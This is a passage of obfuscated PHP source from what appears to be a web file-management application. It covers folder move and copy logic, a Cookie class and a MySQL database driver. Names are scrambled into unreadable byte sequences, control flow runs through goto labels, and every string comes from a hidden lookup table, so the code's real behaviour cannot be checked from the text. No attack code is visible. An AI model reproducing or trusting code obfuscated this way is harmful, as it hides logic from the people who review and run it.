$this->_moveForce($cÑÇ„Ø¨Ç, $dÚÁùêÑ…å, $Bô«òæî‡); } $d‡ù‘”ñ½— = $Dî©¹‹áÇ•; goto fÅãˆ«…ñº; E‰—Ù ŒÓÔ: } private function _moveForce($B““·Ğö£ö, $dÙ¹‚±ŠÈÛ, $e¦°²ŠÊĞÀ) { goto cŠ§Ä Çí; aí…Ã†é: if ($F†à›±ËÚì) { $EÜ½æ„´ = array($Bö†ÕÕ¶Œ[557] => array($Bö†ÕÕ¶Œ[516], $F½ÚÓ§‡ÓÉ[$Bö†ÕÕ¶Œ[490]] . $F½ÚÓ§‡ÓÉ[$Bö†ÕÕ¶Œ[399]] . $Bö†ÕÕ¶Œ[517])); $bå¹¯¬åËÎ = $F½ÚÓ§‡ÓÉ[$Bö†ÕÕ¶Œ[490]] . $F½ÚÓ§‡ÓÉ[$Bö†ÕÕ¶Œ[399]] . $Bö†ÕÕ¶Œ[57]; $Bá¹ëÒˆÀÆ = $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[490]] . $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[399]] . $Bö†ÕÕ¶Œ[57] . $F½ÚÓ§‡ÓÉ[$Bö†ÕÕ¶Œ[399]] . $Bö†ÕÕ¶Œ[57]; $eâõËãÖ©¹ = array($Bö†ÕÕ¶Œ[557] => array($Bö†ÕÕ¶Œ[565], "\162\145\x70\154\141\143\x65\x28\160\141\x72\x65\x6e\x74\x4c\145\x76\x65\154\54\47{$bå¹¯¬åËÎ}\47\x2c\x27{$Bá¹ëÒˆÀÆ}\47\51"), $Bö†ÕÕ¶Œ[553] => $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[407]], $Bö†ÕÕ¶Œ[554] => $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[487]]); if ($b–È’ƒÜŒš) { $eâõËãÖ©¹[$Bö†ÕÕ¶Œ[425]] = 0; } $this->where($EÜ½æ„´)->data($eâõËãÖ©¹)->save(); } $this->where(array($Bö†ÕÕ¶Œ[413] => $B““·Ğö£ö))->data($aÁÇ•†°ğ)->save(); return $B““·Ğö£ö; goto EÅÆàç ó°; cŠ§Ä Çí: $Bö†ÕÕ¶Œ =& $_SERVER[¾÷]; $F½ÚÓ§‡ÓÉ = $this->sourceInfo($B““·Ğö£ö); $EªÉ›ÁìÊ = $this->sourceInfo($dÙ¹‚±ŠÈÛ); goto D¡…­‰Œª—; D¡…­‰Œª—: $F†à›±ËÚì = $F½ÚÓ§‡ÓÉ[$Bö†ÕÕ¶Œ[406]] == $Bö†ÕÕ¶Œ[96]; $aÁÇ•†°ğ = array($Bö†ÕÕ¶Œ[398] => $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[399]], $Bö†ÕÕ¶Œ[557] => $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[490]] . $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[399]] . $Bö†ÕÕ¶Œ[57], $Bö†ÕÕ¶Œ[553] => $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[407]], $Bö†ÕÕ¶Œ[554] => $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[487]], $Bö†ÕÕ¶Œ[556] => USER_ID, $Bö†ÕÕ¶Œ[416] => $e¦°²ŠÊĞÀ); $B­ãÔÖ¬İÉ = $F½ÚÓ§‡ÓÉ[$Bö†ÕÕ¶Œ[407]] == SourceModel::TYPE_GROUP && $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[407]] == SourceModel::TYPE_GROUP && $F½ÚÓ§‡ÓÉ[$Bö†ÕÕ¶Œ[487]] == $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[487]]; goto FÚõ—„›åò; FÚõ—„›åò: if (!$B­ãÔÖ¬İÉ && $this->moveClearAuth) { Model($Bö†ÕÕ¶Œ[485])->authClear($B““·Ğö£ö); } $b–È’ƒÜŒš = $F½ÚÓ§‡ÓÉ[$Bö†ÕÕ¶Œ[426]] == $Bö†ÕÕ¶Œ[96] && $EªÉ›ÁìÊ[$Bö†ÕÕ¶Œ[426]] != $Bö†ÕÕ¶Œ[96]; if ($b–È’ƒÜŒš) { $aÁÇ•†°ğ[$Bö†ÕÕ¶Œ[425]] = 0; } goto aí…Ã†é; EÅÆàç ó°: } private function clearShare($aÆñçµäˆŒ, $e™„ÛÁÍŒÂ) { goto E•¥‚öîÔÇ; E•¥‚öîÔÇ: $c©İğÍ³ĞÎ =& $_SERVER[¾÷]; $dØ“ÀÒÌˆí = $this->sourceInfo($aÆñçµäˆŒ); $Dã´à‚¨Ñ‡ = $this->sourceInfo($e™„ÛÁÍŒÂ); goto aŒÁº º´²; CŞÒì¢Å…: if (!$bï»¨Ïãñ) { return; } $D«ã¿ÊÜ‰ = array($c©İğÍ³ĞÎ[399] => array($c©İğÍ³ĞÎ[17], $bï»¨Ïãñ), $c©İğÍ³ĞÎ[478] => 1); $C»ê¡´Ñ“ø = Model($c©İğÍ³ĞÎ[567])->field($c©İğÍ³ĞÎ[471])->where($D«ã¿ÊÜ‰)->select(); goto F¢÷Òõùîğ; aŒÁº º´²: if ($dØ“ÀÒÌˆí[$c©İğÍ³ĞÎ[487]] == $Dã´à‚¨Ñ‡[$c©İğÍ³ĞÎ[487]] && $dØ“ÀÒÌˆí[$c©İğÍ³ĞÎ[407]] == $c©İğÍ³ĞÎ[566]) { return; } $D«ã¿ÊÜ‰ = array($c©İğÍ³ĞÎ[490] => array($c©İğÍ³ĞÎ[516], $dØ“ÀÒÌˆí[$c©İğÍ³ĞÎ[490]] . $aÆñçµäˆŒ . $c©İğÍ³ĞÎ[517])); $bï»¨Ïãñ = $this->field($c©İğÍ³ĞÎ[413])->where($D«ã¿ÊÜ‰)->getField($c©İğÍ³ĞÎ[399], !0); goto CŞÒì¢Å…; bæöš©ñˆÕ: Model($c©İğÍ³ĞÎ[567])->where($D«ã¿ÊÜ‰)->save(array($c©İğÍ³ĞÎ[478] => 0)); Model($c©İğÍ³ĞÎ[568])->where($D«ã¿ÊÜ‰)->delete(); goto E–ª‹ÓÏˆ§; F¢÷Òõùîğ: if (!$C»ê¡´Ñ“ø) { return; } $C»ê¡´Ñ“ø = array_to_keyvalue($C»ê¡´Ñ“ø, $c©İğÍ³ĞÎ[43], $c©İğÍ³ĞÎ[471]); $D«ã¿ÊÜ‰ = array($c©İğÍ³ĞÎ[471] => array($c©İğÍ³ĞÎ[17], $C»ê¡´Ñ“ø)); goto bæöš©ñˆÕ; E–ª‹ÓÏˆ§: } public function copyFolderFromIO($A‡‚§ßÚİ, $E£Îàî’, $CÈùÍ¾ÕÓÌ, $d¥Ã ‡Ê‘’, $e‘ÇÌİïİš, $EÇæ•­ê­è = false) { goto b­©È»óî×; c½£·ŒÂÊ´: $this->updateModifyTime($CÈùÍ¾ÕÓÌ); return $a¡‰ˆÁ–Ö ; goto fÁÄ“§½¨­; A±ÔæÓšç¥: Model($a‰Ø¦ù–Ç‹[536])->addAll($Eêç—æ¶œ[$a‰Ø¦ù–Ç‹[534]], array(), !0); Model($a‰Ø¦ù–Ç‹[537])->eventCopy($a¡‰ˆÁ–Ö ); $this->saveAll($Eêç—æ¶œ[$a‰Ø¦ù–Ç‹[535]]); goto BáÀì…ë±; d‡­¾ÀŠŠ»: Hook::trigger($a‰Ø¦ù–Ç‹[571]); if ($a¡‰ˆÁ–Ö ) { $this->folderSizeResetChildren($a¡‰ˆÁ–Ö ); } $this->_childrenListClear(); goto A±ÔæÓšç¥; b­©È»óî×: $a‰Ø¦ù–Ç‹ =& $_SERVER[¾÷]; $Eêç—æ¶œ = array($a‰Ø¦ù–Ç‹[534] => array(), $a‰Ø¦ù–Ç‹[535] => array(), $a‰Ø¦ù–Ç‹[533] => array(), $a‰Ø¦ù–Ç‹[569] => array()); $cŠ«¢¢ •ë = $EÇæ•­ê­è ? $EÇæ•­ê­è : $A‡‚§ßÚİ->pathThis($E£Îàî’); goto F‚íï¤¿Ó¸; BáÀì…ë±: Model($a‰Ø¦ù–Ç‹[453])->linkAdd($Eêç—æ¶œ[$a‰Ø¦ù–Ç‹[533]]); Model($a‰Ø¦ù–Ç‹[453])->remove($Eêç—æ¶œ[$a‰Ø¦ù–Ç‹[569]]); $this->folderSizeReset($CÈùÍ¾ÕÓÌ); goto c½£·ŒÂÊ´; F‚íï¤¿Ó¸: $fŒë§Äõ…Î = $this->fileNameExist($CÈùÍ¾ÕÓÌ, $cŠ«¢¢ •ë); $a¡‰ˆÁ–Ö  = $this->mkdir($CÈùÍ¾ÕÓÌ, $cŠ«¢¢ •ë, $d¥Ã ‡Ê‘’); if (!$fŒë§Äõ…Î || $d¥Ã ‡Ê‘’ == REPEAT_RENAME_FOLDER) { $d¥Ã ‡Ê‘’ = !1; } goto FŒß…¨¿¿; FŒß…¨¿¿: if ($fŒë§Äõ…Î) { $this->_childrenAllMake($fŒë§Äõ…Î); } Hook::trigger($a‰Ø¦ù–Ç‹[570]); $this->_copyChildTo($A‡‚§ßÚİ, $E£Îàî’, $a¡‰ˆÁ–Ö , $d¥Ã ‡Ê‘’, $Eêç—æ¶œ, $e‘ÇÌİïİš); goto d‡­¾ÀŠŠ»; fÁÄ“§½¨­: } private function _copyChildTo($aå¬Ä³èÈ­, $a±­Äù§ñ, $Eª…ìƒ¶É, $C¨Ô†¿¬ô, &$aÛ¿µ·, $AëäÄµñˆ) { goto Bë’Ú°óä; CÙÜéäÕ: foreach ($aôÁÎ¥ºõ¾ as &$CÏØáàèä») { goto C÷ßò¥ØÊÎ; b¶…ì–›: $CÏØáàèä»[$e è¶´…[87]] = _get($CÏØáàèä», $e è¶´…[87], 0); $CÏØáàèä»[$e è¶´…[450]] = _get($CÏØáàèä», $e è¶´…[450], 0); if (!isset($CÏØáàèä»[$e è¶´…[572]]) && $CÏØáàèä»[$e è¶´…[450]]) { $aÛ¿µ·[$e è¶´…[569]][] = $CÏØáàèä»[$e è¶´…[450]]; } goto D¼İøìØöå; C÷ßò¥ØÊÎ: if (isset($BëÓÜÊ·Î–[$CÏØáàèä»[$e è¶´…[38]]])) { $CÏØáàèä» = $BëÓÜÊ·Î–[$CÏØáàèä»[$e è¶´…[38]]]; } $CÏØáàèä»[$e è¶´…[406]] = $CÏØáàèä»[$e è¶´…[39]] == $e è¶´…[86]; $CÏØáàèä»[$e è¶´…[408]] = _get($CÏØáàèä», $e è¶´…[177], $e è¶´…[43]); goto b¶…ì–›; D¼İøìØöå: if ($C¨Ô†¿¬ô) { $cÈ„Ì÷ëåß = $this->fileNameExistCache($Eª…ìƒ¶É, $CÏØáàèä»[$e è¶´…[38]]); if ($cÈ„Ì÷ëåß) { if ($CÏØáàèä»[$e è¶´…[406]] || $C¨Ô†¿¬ô == REPEAT_SKIP) { continue; } if ($C¨Ô†¿¬ô == REPEAT_REPLACE) { $FÍÜŒ¡Á’ó = $this->sourceInfoCache($cÈ„Ì÷ëåß); $fù®˜Œù´ = $this->fileHistory($FÍÜŒ¡Á’ó, $CÏØáàèä»[$e è¶´…[450]], $CÏØáàèä»[$e è¶´…[87]]); if ($fù®˜Œù´) { $aÛ¿µ·[$e è¶´…[533]][] = $CÏØáàèä»[$e è¶´…[450]]; } continue; } else { if ($C¨Ô†¿¬ô == REPEAT_RENAME) { $CÏØáàèä»[$e è¶´…[38]] = $this->fileNameAutoCache($Eª…ìƒ¶É, $CÏØáàèä»[$e è¶´…[38]], $C¨Ô†¿¬ô, !1); } } } } if (!$CÏØáàèä»[$e è¶´…[406]] && $CÏØáàèä»[$e è¶´…[450]]) { $aÛ¿µ·[$e è¶´…[533]][] = $CÏØáàèä»[$e è¶´…[450]]; } $b«èÚé‚ôö[] = $this->_makeItemData($CÏØáàèä», $fæˆ§…¢ä¾, $CÏØáàèä»[$e è¶´…[38]]); goto b½­±ÒÕÖ; b½­±ÒÕÖ: } unset($CÏØáàèä»); if (!empty($b«èÚé‚ôö)) { $this->addAll($b«èÚé‚ôö); $this->_childrenListSelect($Eª…ìƒ¶É); } goto eĞœÙ¹ê­; dÃËåñœí: $aôÁÎ¥ºõ¾ = array_merge($Dï‰ãå¸¦[$e è¶´…[83]], $Dï‰ãå¸¦[$e è¶´…[84]]); $BëÓÜÊ·Î– = $this->_addFiles($aå¬Ä³èÈ­, $Dï‰ãå¸¦[$e è¶´…[83]], $AëäÄµñˆ); $b«èÚé‚ôö = array(); goto CÙÜéäÕ; Bë’Ú°óä: $e è¶´… =& $_SERVER[¾÷]; $fæˆ§…¢ä¾ = $this->sourceInfoCache($Eª…ìƒ¶É); $Dï‰ãå¸¦ = $aå¬Ä³èÈ­->listPath($a±­Äù§ñ); goto dÃËåñœí; eĞœÙ¹ê­: $E“ƒ¾öƒ— = $this->_childrenList($Eª…ìƒ¶É); $E“ƒ¾öƒ— = array_to_keyvalue($E“ƒ¾öƒ—, $e è¶´…[38]); foreach ($aôÁÎ¥ºõ¾ as $CÏØáàèä») { $FÍÜŒ¡Á’ó = $E“ƒ¾öƒ—[$CÏØáàèä»[$e è¶´…[38]]]; $e²³ÎÀã„ = $FÍÜŒ¡Á’ó[$e è¶´…[399]]; $this->_copyApplyMeta($FÍÜŒ¡Á’ó, $aÛ¿µ·); if ($CÏØáàèä»[$e è¶´…[39]] == $e è¶´…[86]) { $CÏØáàèä»[$e è¶´…[85]] = $aå¬Ä³èÈ­->getPathInner($CÏØáàèä»[$e è¶´…[85]]); $this->_copyChildTo($aå¬Ä³èÈ­, $CÏØáàèä»[$e è¶´…[85]], $e²³ÎÀã„, $C¨Ô†¿¬ô, $aÛ¿µ·, $AëäÄµñˆ); } } goto b£ä©Œ¸Å; b£ä©Œ¸Å: } private function _addFiles($EÌ½“…èÔª, $cçøæÍ»Ğ, $cÙÜÏ»Ÿò¨) { goto CÔµÍËŸ¸¸; C´‘…²êš”: $dŸÍÇÌÆ->addAll($f‚à§åó™Ÿ); $A³ß‹ÀÊÇ  = array($cƒÛ‘‡Òò™[179] => array($cƒÛ‘‡Òò™[17], array_keys($f‚ÖÔÁ³ˆã))); $AªËï‘”– = $dŸÍÇÌÆ->where($A³ß‹ÀÊÇ )->select(); goto b÷œ¹ïğîÌ; CÔµÍËŸ¸¸: $cƒÛ‘‡Òò™ =& $_SERVER[¾÷]; if (!$cçøæÍ»Ğ || count($cçøæÍ»Ğ) == 0) { return array(); } $f‚ÖÔÁ³ˆã = array(); goto BÀ·®ÉÉ­ß; b÷œ¹ïğîÌ: $AªËï‘”– = $AªËï‘”– ? $AªËï‘”– : array(); foreach ($AªËï‘”– as $C´¼Õ¥ºæ°) { if (!isset($f‚ÖÔÁ³ˆã[$C´¼Õ¥ºæ°[$cƒÛ‘‡Òò™[179]]])) { continue; } $E²¡…«„†¡ =& $f‚ÖÔÁ³ˆã[$C´¼Õ¥ºæ°[$cƒÛ‘‡Òò™[179]]]; foreach ($E²¡…«„†¡ as &$a¥ìƒì‡Ö) { $a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[450]] = $C´¼Õ¥ºæ°[$cƒÛ‘‡Òò™[450]]; } unset($a¥ìƒì‡Ö); } $e›îèºôŠî = array(); goto F½½ÒÍ£é¬; cåğéáËœ: foreach ($AªËï‘”– as $C´¼Õ¥ºæ°) { if (!isset($f‚ÖÔÁ³ˆã[$C´¼Õ¥ºæ°[$cƒÛ‘‡Òò™[179]]])) { continue; } $E²½ÎŞİˆ = $f‚ÖÔÁ³ˆã[$C´¼Õ¥ºæ°[$cƒÛ‘‡Òò™[179]]]; foreach ($E²½ÎŞİˆ as &$a¥ìƒì‡Ö) { $a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[450]] = $C´¼Õ¥ºæ°[$cƒÛ‘‡Òò™[450]]; $a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[572]] = !0; } unset($a¥ìƒì‡Ö); } $f‚à§åó™Ÿ = array(); foreach ($cçøæÍ»Ğ as $få•˜õšÜØ) { if (isset($få•˜õšÜØ[$cƒÛ‘‡Òò™[572]]) && $få•˜õšÜØ[$cƒÛ‘‡Òò™[572]]) { continue; } $a¿ªâ¥Ø²‡ = $EÌ½“…èÔª->getPathInner($få•˜õšÜØ[$cƒÛ‘‡Òò™[85]]); $eï¡¢¨ÃÌÑ = $dŸÍÇÌÆ->addFileMake($a¿ªâ¥Ø²‡, $få•˜õšÜØ[$cƒÛ‘‡Òò™[87]], $få•˜õšÜØ[$cƒÛ‘‡Òò™[180]], $få•˜õšÜØ[$cƒÛ‘‡Òò™[179]], $få•˜õšÜØ[$cƒÛ‘‡Òò™[38]], $cÙÜÏ»Ÿò¨); $f‚à§åó™Ÿ[] = $eï¡¢¨ÃÌÑ; } goto C´‘…²êš”; F½½ÒÍ£é¬: foreach ($cçøæÍ»Ğ as $D®¦¹Ëê) { $e›îèºôŠî[$D®¦¹Ëê[$cƒÛ‘‡Òò™[38]]] = $D®¦¹Ëê; } return $e›îèºôŠî; goto e°åÄ½ĞÆ×; BÀ·®ÉÉ­ß: foreach ($cçøæÍ»Ğ as &$a¥ìƒì‡Ö) { goto aÕäî…‚‹; cËç°¦Çí: if (count($f‚ÖÔÁ³ˆã[$D‚Æ‹á—ÒŠ]) > 1) { $a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[572]] = !0; } goto d¥Ûò½ÜÓ; A¬˜õíìØ³: $D‚Æ‹á—ÒŠ = $EÌ½“…èÔª->hashMd5($a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[85]]); if (strlen($D‚Æ‹á—ÒŠ) > 10 && !isset($f‚ÖÔÁ³ˆã[$D‚Æ‹á—ÒŠ])) { $f‚ÖÔÁ³ˆã[$D‚Æ‹á—ÒŠ] = array(); } $a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[180]] = $e×—§Ğùƒ©; goto Dò°Ş›¡‰œ; Dò°Ş›¡‰œ: $a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[179]] = $D‚Æ‹á—ÒŠ; Hook::trigger($cƒÛ‘‡Òò™[574], $a¥ìƒì‡Ö); $f‚ÖÔÁ³ˆã[$D‚Æ‹á—ÒŠ][] =& $a¥ìƒì‡Ö; goto cËç°¦Çí; aÕäî…‚‹: Hook::trigger($cƒÛ‘‡Òò™[573], $a¥ìƒì‡Ö); $a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[85]] = $EÌ½“…èÔª->getPathInner($a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[85]]); $e×—§Ğùƒ© = $EÌ½“…èÔª->hashSimple($a¥ìƒì‡Ö[$cƒÛ‘‡Òò™[85]]); goto A¬˜õíìØ³; d¥Ûò½ÜÓ: } unset($a¥ìƒì‡Ö); $A³ß‹ÀÊÇ  = array($cƒÛ‘‡Òò™[179] => array($cƒÛ‘‡Òò™[17], array_keys($f‚ÖÔÁ³ˆã))); goto E§Š¸Õ»•°; E§Š¸Õ»•°: $dŸÍÇÌÆ = Model($cƒÛ‘‡Òò™[575]); $AªËï‘”– = $dŸÍÇÌÆ->where($A³ß‹ÀÊÇ )->select(); $AªËï‘”– = $AªËï‘”– ? $AªËï‘”– : array(); goto cåğéáËœ; e°åÄ½ĞÆ×: } } goto b›òËŠÒï; AŒÁë™‰: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($B¿ÍùÏ‘ËÜ = '', $CôÏ¾ùåÍ  = 0) { if (is_string($B¿ÍùÏ‘ËÜ) && $B¿ÍùÏ‘ËÜ != $_SERVER[¾÷][43]) { $this->prefix = $B¿ÍùÏ‘ËÜ; } if (is_numeric($CôÏ¾ùåÍ ) && $CôÏ¾ùåÍ  > 0) { $this->expire = $CôÏ¾ùåÍ ; } } public static function getInstance() { static $AËá  æ©é; if ($AËá  æ©é === null) { $AËá  æ©é = new self(); } return $AËá  æ©é; } private static $cookieDisable = false; public static function disable($d´°ŠéŸ½Ã) { self::$cookieDisable = $d´°ŠéŸ½Ã; } private static $sameCookieSet = array(); public static function set($e÷˜‚½’ë, $f–¿‘±Ã¹, $E·’•‰Ï©Ô = 0, $e†‹ çêë = false, $DêÖàÂ‚ = false) { goto AÌáÍ‚ØÒ; eî¬Â§âô: $Eêàğœ“ = $eËÏï® «[43]; setcookie($e÷˜‚½’ë, $f–¿‘±Ã¹, time() + $E·’•‰Ï©Ô, $eËÏï® «[18] . trim($DêÖàÂ‚, $eËÏï® «[18]) . $Eêàğœ“, !1, !1, $e†‹ çêë); goto BÓµ”Œï¹°; d¥‡µã°Œ: if (isset(self::$sameCookieSet[$e÷˜‚½’ë]) && self::$sameCookieSet[$e÷˜‚½’ë] == $f–¿‘±Ã¹ . $E·’•‰Ï©Ô) { return; } self::$sameCookieSet[$e÷˜‚½’ë] = $f–¿‘±Ã¹ . $E·’•‰Ï©Ô; if (!$DêÖàÂ‚) { $DêÖàÂ‚ = str_replace(HOST, $eËÏï® «[43], APP_HOST); $DêÖàÂ‚ = _get($GLOBALS, $eËÏï® «[821], $DêÖàÂ‚); } goto eî¬Â§âô; AÌáÍ‚ØÒ: $eËÏï® « =& $_SERVER[¾÷]; if (self::$cookieDisable) { return; } if (!$E·’•‰Ï©Ô) { $E·’•‰Ï©Ô = 24 * 3600 * 7; } goto d¥‡µã°Œ; BÓµ”Œï¹°: } public static function setSafe($DŒƒ­›¤ôå, $Eƒº‘¤×¨, $cùëŸøÆµ = 0) { self::set($DŒƒ­›¤ôå, $Eƒº‘¤×¨, $cùëŸøÆµ, !0); } public static function get($A¾ß²ø³—â) { return isset($_COOKIE[$A¾ß²ø³—â]) ? $_COOKIE[$A¾ß²ø³—â] : !1; } public static function remove($a´«ÄİÓ™£, $e½ŠÃò‰×‹ = false) { unset($_COOKIE[$a´«ÄİÓ™£]); self::set($a´«ÄİÓ™£, $_SERVER[¾÷][43], 1, $e½ŠÃò‰×‹); } } class DbMysql extends Db { public function __construct($D•ˆ®ª—¾Ä = '') { $Eí±â¼ğ’Î =& $_SERVER[¾÷]; if (!extension_loaded($Eí±â¼ğ’Î[751])) { think_exception(think_lang($Eí±â¼ğ’Î[20]) . $Eí±â¼ğ’Î[822]); } if (!empty($D•ˆ®ª—¾Ä)) { $this->config = $D•ˆ®ª—¾Ä; if (empty($this->config[$Eí±â¼ğ’Î[23]])) { $this->config[$Eí±â¼ğ’Î[23]] = $Eí±â¼ğ’Î[43]; } } } public function connect($AŒ²ã¿¿ŠÖ = '', $a»¼¡÷µø­ = 0, $b çã¶É£ = false) { $dÁÓÙä›¤ë =& $_SERVER[¾÷]; if (!isset($this->linkID[$a»¼¡÷µø­])) { goto f…šÕõµ‡İ; D¦´¾ÏÚØ: if ($eğŸèá·‰½) { $this->linkID[$a»¼¡÷µø­] = mysql_pconnect($CäÏ·†ˆƒ, $AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[825]], $AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[826]], 131072); } else { $this->linkID[$a»¼¡÷µø­] = mysql_connect($CäÏ·†ˆƒ, $AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[825]], $AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[826]], !0, 131072); } if (!$this->linkID[$a»¼¡÷µø­] || !empty($AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[27]]) && !mysql_select_db($AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[27]], $this->linkID[$a»¼¡÷µø­])) { think_exception(mysql_error()); } $a…´¢‡ªÃÍ = mysql_get_server_info($this->linkID[$a»¼¡÷µø­]); goto bšÜƒªá; D‚ïé‘µ‚¸: if (1 != think_config($dÁÓÙä›¤ë[28])) { unset($this->config); } goto B¬ô³ÜÙöŠ; bšÜƒªá: mysql_query($dÁÓÙä›¤ë[827] . think_config($dÁÓÙä›¤ë[828]) . $dÁÓÙä›¤ë[65], $this->linkID[$a»¼¡÷µø­]); if ($a…´¢‡ªÃÍ > $dÁÓÙä›¤ë[829]) { mysql_query($dÁÓÙä›¤ë[830], $this->linkID[$a»¼¡÷µø­]); } $this->connected = !0; goto D‚ïé‘µ‚¸; f…šÕõµ‡İ: if (empty($AŒ²ã¿¿ŠÖ)) { $AŒ²ã¿¿ŠÖ = $this->config; } $CäÏ·†ˆƒ = $AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[823]] . ($AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[824]] ? "\72{$AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[824]]}" : $dÁÓÙä›¤ë[43]); $eğŸèá·‰½ = !empty($AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[23]][$dÁÓÙä›¤ë[24]]) ? $AŒ²ã¿¿ŠÖ[$dÁÓÙä›¤ë[23]][$dÁÓÙä›¤ë[24]] : $this->pconnect; goto D¦´¾ÏÚØ; B¬ô³ÜÙöŠ: } return $this->linkID[$a»¼¡÷µø­]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($CÁ´òÕÀÅ) { goto dôãí¿Öæ; dôãí¿Öæ: $fõÉ¢ôŞ© =& $_SERVER[¾÷]; if (0 === stripos($CÁ´òÕÀÅ, $fõÉ¢ôŞ©[269])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto cÌñÎ¦§Œå; C‹åØÑÈ§: think_action_status($fõÉ¢ôŞ©[29], 1); think_status($fõÉ¢ôŞ©[30]); $this->queryID = mysql_query($CÁ´òÕÀÅ, $this->_linkID); goto FìÉºËù—Ô; FìÉºËù—Ô: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto bó‰©´‰ì†; cÌñÎ¦§Œå: if (!$this->_linkID) { return !1; } $this->queryStr = $CÁ´òÕÀÅ; if ($this->queryID) { $this->free(); } goto C‹åØÑÈ§; bó‰©´‰ì†: } public function execute($B½‚Ø—Ş„È) { goto bŞÄ‡—öÇ; bÑ¸‹ö¤ªÃ: if (!1 === $Fò•©’•±³) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto C˜Í™İª®; fòÖî¹«Óµ: think_status($f÷ª¨®×â³[30]); $Fò•©’•±³ = mysql_query($B½‚Ø—Ş„È, $this->_linkID); $this->debug(); goto bÑ¸‹ö¤ªÃ; bŞÄ‡—öÇ: $f÷ª¨®×â³ =& $_SERVER[¾÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÔ–¼“ƒì; BÔ–¼“ƒì: $this->queryStr = $B½‚Ø—Ş„È; if ($this->queryID) { $this->free(); } think_action_status($f÷ª¨®×â³[31], 1); goto fòÖî¹«Óµ; C˜Í™İª®: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¾÷][831], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EĞ²Ğ×æêª = mysql_query($_SERVER[¾÷][832], $this->_linkID); $this->transTimes = 0; if (!$EĞ²Ğ×æêª) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aŒ¯ô…ïˆ‚ = mysql_query($_SERVER[¾÷][833], $this->_linkID); $this->transTimes = 0; if (!$aŒ¯ô…ïˆ‚) { $this->error(); return !1; } } return !0; } private function getAll() { $aïˆ‹¬ìšŒ = array(); if ($this->numRows > 0) { while ($A¼á©ã¸æ§ = mysql_fetch_assoc($this->queryID)) { $aïˆ‹¬ìšŒ[] = $A¼á©ã¸æ§; } mysql_data_seek($this->queryID, 0); } return $aïˆ‹¬ìšŒ; } public function getFields($cóŞ§õ†›) { $A‰¬Öå«Û² =& $_SERVER[¾÷]; $bç‰¾¥©¥ = $this->query($A‰¬Öå«Û²[834] . $this->parseKey($cóŞ§õ†›)); $BÂ˜ôŸœº = array(); if ($bç‰¾¥©¥) { foreach ($bç‰¾¥©¥ as $Bñï½Ï‹‹ù => $Fƒ’ëöŒ¸ª) { $BÂ˜ôŸœº[$Fƒ’ëöŒ¸ª[$A‰¬Öå«Û²[37]]] = array($A‰¬Öå«Û²[38] => $Fƒ’ëöŒ¸ª[$A‰¬Öå«Û²[37]], $A‰¬Öå«Û²[39] => $Fƒ’ëöŒ¸ª[$A‰¬Öå«Û²[40]], $A‰¬Öå«Û²[41] => (bool) (strtoupper($Fƒ’ëöŒ¸ª[$A‰¬Öå«Û²[42]]) === $A‰¬Öå«Û²[835]), $A‰¬Öå«Û²[44] => $Fƒ’ëöŒ¸ª[$A‰¬Öå«Û²[45]], $A‰¬Öå«Û²[46] => strtolower($Fƒ’ëöŒ¸ª[$A‰¬Öå«Û²[47]]) == $A‰¬Öå«Û²[48], $A‰¬Öå«Û²[49] => strtolower($Fƒ’ëöŒ¸ª[$A‰¬Öå«Û²[50]]) == $A‰¬Öå«Û²[51]); } } return $BÂ˜ôŸœº; } public function getTables($b£Áìá• = '') { $Aˆ×÷ã‘àÂ =& $_SERVER[¾÷]; if (!empty($b£Áìá•)) { $fôæÌÓ½É = $Aˆ×÷ã‘àÂ[836] . $b£Áìá• . $Aˆ×÷ã‘àÂ[837]; } else { $fôæÌÓ½É = $Aˆ×÷ã‘àÂ[838]; } $a„¥‰ÎÓˆÍ = $this->query($fôæÌÓ½É); $A¼º±¾Œº¼ = array(); foreach ($a„¥‰ÎÓˆÍ as $DŠİã…”‹¬ => $AŸ—³æ´Í) { $A¼º±¾Œº¼[$DŠİã…”‹¬] = current($AŸ—³æ´Í); } return $A¼º±¾Œº¼; } public function replace($e‡©ã„©š¦, $f¹î…ˆ³Ï = array()) { $CÔİ§ÄŸêª =& $_SERVER[¾÷]; foreach ($e‡©ã„©š¦ as $bƒãÕñóÈê => $D¼´íˆ™’ƒ) { 